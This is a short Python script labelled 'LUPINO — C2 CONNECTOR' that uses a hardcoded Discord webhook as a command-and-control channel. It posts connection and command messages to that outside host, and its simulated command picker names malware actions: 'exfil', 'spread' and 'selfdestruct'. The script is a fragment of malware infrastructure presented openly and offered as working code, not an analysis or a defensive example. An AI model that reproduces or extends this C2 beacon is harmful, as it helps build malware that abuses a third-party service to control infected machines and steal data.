# ============================================================
# LUPINO — C2 CONNECTOR
# WATERMARK: 𝕍𝕠𝕤𝕤🥷 | SESSION: 0585f9bc...
# ============================================================

import requests
import json

webhook = "https://discord.com/api/webhooks/1538679964357107742/gp4Fdmc-h0i3Azx90tPm9t-pRlenPKpO1dh-1uOMCxOo6XMLPcTYsSoonKViSM82FxLk"

def send_command(command):
    payload = {"content": f"[C2] Command: {command}"}
    requests.post(webhook, json=payload)

def receive_command():
    # Simulated command retrieval
    commands = ["exfil", "spread", "selfdestruct"]
    import random
    return random.choice(commands)

if __name__ == "__main__":
    send_command("C2 connected.")
    cmd = receive_command()
    send_command(f"Command received: {cmd}")


